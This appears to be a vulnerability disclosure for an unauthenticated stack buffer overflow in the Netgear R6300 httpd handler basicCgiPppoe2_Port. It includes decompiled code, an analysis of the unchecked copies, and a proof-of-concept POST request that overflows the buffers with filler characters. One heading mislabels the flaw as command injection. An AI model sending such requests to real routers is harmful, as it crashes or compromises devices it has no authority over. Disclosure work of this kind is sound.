# Buffer Overflow Vulnerability in `basicCgiPppoe2_Port`

1. Vulnerability Overview

| **Field**            | **Details**                                                  |
| -------------------- | ------------------------------------------------------------ |
| Affected Product     | Netgear R6300 Router                                         |
| Firmware Version     | V1.0.2.80_1.0.59                                             |
| Vulnerability Type   | **Buffer Overflow**                                          |
| Vulnerable Component | `httpd` (`basicCgiPppoe2_Port`)                              |
| Prerequisites        | No authentication required; attacker must supply crafted inputs via web interface parameters `Port_1`, `Port_2`, `Protocol`, `policyIndex` |

2. Exploitation Path

```c
int __fastcall basicCgiPppoe2_Port(int a1, int a2)
{
  int v4; // $a1
  char v6[8]; // [sp+18h] [-120h] BYREF
  char v7[8]; // [sp+20h] [-118h] BYREF
  char v8[8]; // [sp+28h] [-110h] BYREF
  char v9[8]; // [sp+30h] [-108h] BYREF
  char v10[256]; // [sp+38h] [-100h] BYREF

  memset(v6, 0, sizeof(v6));
  memset(v7, 0, sizeof(v7));
  memset(v8, 0, sizeof(v8));
  memset(v10, 0, sizeof(v10));
  websGetVar(a1, "Port_1", v6);
  strcpy(v10, v6);
  strcat(v10, "-");
  websGetVar(a1, "Port_2", v7);
  strcat(v10, v7);
  websGetVar(a1, "Protocol", v8);
  strcat(v10, ",");
  strcat(v10, v8);
  websGetVar(a1, "policyIndex", v9);
  if ( v9[0] )
    v4 = atoi(v9);
  else
    v4 = 0;
  sub_42505C(v10, v4);
  sendPage2Client("BAS_basic.htm", a2);
  return 0;
}
```

3. **Vulnerable Binaries:** The vulnerability resides in the `httpd` binary.

4. 0-Day Command Injection Exploitation Path: 
   - In the `basicCgiPppoe2_Port` function at line 14, the call `websGetVar(a1, "Port_1", v6)` writes into a destination buffer `v6` of size **8 bytes**. While `websGetVar` enforces a 255-byte limit, no additional validation is performed, resulting in a buffer overflow vulnerability.
   - At line 17, `websGetVar(a1, "Port_2", v7)` stores attacker-controlled input into the **8-byte** buffer `v7` under the same insufficient constraints, leading to a buffer overflow vulnerability.
   - At line 19, `websGetVar(a1, "Protocol", v8)` targets the **8-byte** buffer `v8`, again exposing a buffer overflow vulnerability due to lack of length checks beyond the 255-byte restriction.
   - At line 22, `websGetVar(a1, "policyIndex", v9)` places unvalidated input into the **8-byte** buffer `v9`, causing another buffer overflow vulnerability.
   - At line 21, `strcat(v10, v8)` appends user-controlled content into buffer `v10` (size **256 bytes**). After previous concatenation operations at lines 18 (`strcat(v10, v7)`) and 20 (`strcat(v10, ",")`), this cumulative operation can overflow the buffer `v10`, resulting in a buffer overflow vulnerability.

5. Proof of Concept (PoC) for Reproducing the Vulnerability

```http
POST /cgi-bin/basicCgiPppoe2_Port HTTP/1.1
Host: 192.168.1.1
User-Agent: Mozilla/5.0
Accept: */*
Content-Type: application/x-www-form-urlencoded
Content-Length: 1024
Connection: close

Port_1=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&Port_2=BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
&Protocol=CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC
&policyIndex=DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD
```